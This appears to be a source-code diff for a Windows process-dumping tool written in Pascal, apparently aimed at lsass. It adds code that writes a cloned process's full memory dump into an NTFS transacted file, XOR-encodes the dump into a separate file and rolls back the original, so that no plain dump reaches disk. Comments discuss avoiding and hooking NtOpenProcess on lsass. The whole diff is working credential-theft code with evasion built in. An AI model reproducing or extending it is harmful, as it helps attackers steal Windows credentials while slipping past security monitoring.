@@ -224,6 +224,19 @@ implementation
 var
 MiniDumpWriteDump:function (hProcess: HANDLE; ProcessId: DWORD; hFile: HANDLE; DumpType: MINIDUMP_TYPE; ExceptionParam: pointer; UserStreamParam: pointer; CallbackParam: pointer): BOOL; stdcall;
 ImagehlpApiVersion:function() :LPAPI_VERSION; stdcall;
+//
+CreateFileTransactedW:function(
+                 lpFileName:LPCWSTR;
+                   dwDesiredAccess:DWORD;
+                   dwShareMode:DWORD;
+   lpSecurityAttributes:LPSECURITY_ATTRIBUTES;
+                   dwCreationDisposition:DWORD;
+                   dwFlagsAndAttributes:DWORD;
+                  hTemplateFile:THANDLE;
+                  hTransaction:THANDLE;
+                 pusMiniVersion:PUSHORT;
+                   lpExtendedParameter:PVOID
+): THANDLE; stdcall;
 
 dumpBuffer:LPVOID;
 bytesRead:DWORD = 0;
@@ -268,6 +281,61 @@ if processHandle<>thandle(-1) then
    else log('OpenProcess failed');
  end;
 
+function closetransactedfile(hTransaction,hTransactedFile:thandle;commit:boolean=true):boolean;
+var
+  status:ntstatus;
+begin
+     log('**** closetransactedfile **** ');
+     result:=false;
+
+     if commit=false then
+     begin
+     status := NtRollbackTransaction(hTransaction, true);
+     log('NtRollbackTransaction:'+inttohex(status,sizeof(status)));
+     end
+     else
+     begin
+     status := NtCommitTransaction(hTransaction, true);
+     log('NtCommitTransaction:'+inttohex(status,sizeof(status)));
+     end;
+
+     CloseHandle(hTransactedFile);
+     hTransactedFile := INVALID_HANDLE_VALUE;
+
+     NtClose(hTransaction);
+     hTransaction := 0;
+
+     result:=status=0;
+end;
+
+function createtransactedfile(targetapp:widestring;var hTransaction:thandle):thandle;
+var
+  Attrib:OBJECT_ATTRIBUTES;
+  status:ntstatus;
+  //hTransaction:thandle=thandle(-1);
+  //hTransactedFile:thandle=thandle(-1);
+begin
+result:=thandle(-1);
+
+//************** lets create a transacted file
+     log('**** createtransactedfile **** ');
+     InitializeObjectAttributes(Attrib ,nil,0,0,nil);
+     status := NtCreateTransaction(@hTransaction,TRANSACTION_ALL_ACCESS,@Attrib,nil,0,0,0,0,nil,nil);
+     log('NtCreateTransaction:'+inttohex(status,sizeof(status)));
+     if status<>0 then exit;
+
+     CreateFileTransactedW:=getProcAddress(loadlibrary('kernel32.dll'),'CreateFileTransactedW');
+     //create_always if you want to use a non existing file
+     {if FileExists(targetapp) //yes, we would use an existing file...
+             then result:=CreateFileTransactedW(pwidechar(targetapp), GENERIC_WRITE or GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0,hTransaction,nil,nil)
+             else} result:=CreateFileTransactedW(pwidechar(targetapp), GENERIC_WRITE or GENERIC_READ,0,nil,CREATE_ALWAYS ,FILE_ATTRIBUTE_NORMAL,0,hTransaction,nil,nil);
+          if result =thandle(-1) then
+                      begin
+                      log('hTransactedFile=invalid handle,'+inttostr(getlasterror));
+                      exit;
+                      end;
+end;
+
 //using NtCreateProcessEx
 function dumpprocess2(pid:dword):boolean;
 var
@@ -276,6 +344,14 @@ var
   //
   {$IFDEF win32}lib:cardinal;{$endif}
 {$IFDEF win64}lib:int64;{$endif}
+//
+hTransaction:thandle=thandle(-1);
+//
+buffer:pointer;
+hFileout:thandle=thandle(-1);
+dwFileSize:dword;
+dwread:dword=0;
+dwwrite:dword=0;
 begin
 result:=false;
 log('******** dumpprocess2 ********');
@@ -297,7 +373,9 @@ if processHandle<>thandle(-1) then
    //
    if clone>0 then
       begin
-      hFile := CreateFile(pchar(inttostr(pid)+'.dmp'), GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+      //hFile := CreateFile(pchar(inttostr(pid)+'.dmp'), GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+      //we could use NTFS Transaction in order to xor the memory dump before storing it on disk
+      hfile:=createtransactedfile (inttostr(pid)+'.dmp',htransaction);
       MiniDumpWriteDump:=getProcAddress(lib,'MiniDumpWriteDump');
       //lets try with pid=0 to avoid an non necessary ntopenprocess on lsass
       //https://rastamouse.me/dumping-lsass-with-duplicated-handles/
@@ -306,8 +384,25 @@ if processHandle<>thandle(-1) then
       if result=false
          then log('MiniDumpWriteDump failed,'+inttohex(getlasterror,sizeof(dword)))
          else log(inttostr(pid)+'.dmp'+ ' written',1);
-      log('filesize:'+inttostr(getfilesize(hfile,nil)));
-      closehandle(hfile);
+      dwFileSize:=getfilesize(hfile,nil);
+      log('filesize:'+inttostr(dwFileSize));
+      //
+            buffer:=allocmem(dwFileSize);
+            hFileout := CreateFile(pchar(inttostr(pid)+'.dmp.xor'), GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+            SetFilePointer(hfile,0,0,0);
+            while 1=1 do
+            begin
+            ReadFile(hFile,buffer^,8192*4,dwRead,nil);
+            //log('dwread:'+inttostr(dwread));
+            if dwread=0 then break;
+            xorbytes (buffer,dwread);
+            WriteFile(hFileout, buffer^, dwread, dwwrite, nil);
+            end;
+            log(inttostr(pid)+'.dmp.xor'+ ' written - key=FF',1);
+            closehandle(hFileout);
+      //
+      closetransactedfile (hTransaction,hfile,false); //rollback transacted file
+      //closehandle(hfile);
       end else log('NtCreateProcessEx failed');
    closehandle(processHandle );
    TerminateProcess(clone,0);
@@ -413,6 +508,7 @@ if processHandle<>thandle(-1) then
       //uhm...the above, i.e passing pid=0, seems to end with a corrupted dump, when using a callback...
       //update #1:changed pid=0 to pid=getcurrentprocessid so that it works on latest win10
       //update #2:disable this trick for now (w2k19 different behavior...) and sticking to pid=lsass pid ... which will trigger an ntopenprocess to lsass :(
+      //update #3:investigate hooking ntopenprocess...
       if result=false then result := MiniDumpWriteDump(clone, pid, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
       if result=false then log('MiniDumpWriteDump failed,'+inttohex(getlasterror,sizeof(dword)));
       //save dumpbuffer...
